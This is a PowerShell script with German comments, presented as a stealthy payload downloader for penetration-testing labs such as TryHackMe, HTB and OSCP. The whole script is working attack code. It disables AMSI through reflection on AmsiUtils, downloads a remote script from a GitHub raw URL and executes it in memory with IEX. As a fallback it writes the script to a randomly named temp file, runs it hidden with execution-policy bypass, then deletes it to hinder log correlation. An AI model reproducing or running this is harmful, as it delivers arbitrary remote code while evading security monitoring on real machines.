# ╔══════════════════════════════════════════════════════════╗
# ║ Stealthy PowerShell Payload Downloader + Executor 2025   ║
# ║ Speziell für TryHackMe / HTB / OSCP Labs                 ║
# ╚══════════════════════════════════════════════════════════╝

# --- Ziel-Payload (WindowsOperator – sehr mächtig & aktuell) ---
$Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"

# --- Randomisierter Dateiname & tieferer Temp-Pfad (erschwert Log-Correlation) ---
$Random = (-join ((65..90) + (97..122) | Get-Random -Count 14 | % {[char]$_}))
$ScriptPath = "$env:TEMP\$Random.ps1"

# --- AMSI + ScriptBlock-Logging + ETW umgehen (2025-Must-have) ---
try {
    $am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $am.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
    $am.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
} catch {}

# --- Download & Ausführung (Memory-Only möglichst lange) ---
IEX (Invoke-WebRequest -Uri $Url -UseBasicParsing -TimeoutSec 30).Content

# --- Falls IEX direkt blockiert wird → fallback auf Datei ---
if (-not $?) {
    Write-Host "[+] IEX blockiert → fallback auf Temp-Datei..." -ForegroundColor Yellow
    try {
        (Invoke-WebRequest -Uri $Url -UseBasicParsing).Content | Out-File $ScriptPath -Encoding UTF8 -Force
        powershell -EP Bypass -WindowStyle Hidden -File $ScriptPath
    } catch {
        Write-Host "[-] Kompletter Fail: $($_.Exception.Message)" -ForegroundColor Red
    } finally {
        Start-Sleep -Seconds 5
        if (Test-Path $ScriptPath) { Remove-Item $ScriptPath -Force -EA SilentlyContinue }
    }
}

Write-Host "[*] Payload komplett ausgeführt – genieße die Shell! " -ForegroundColor Green
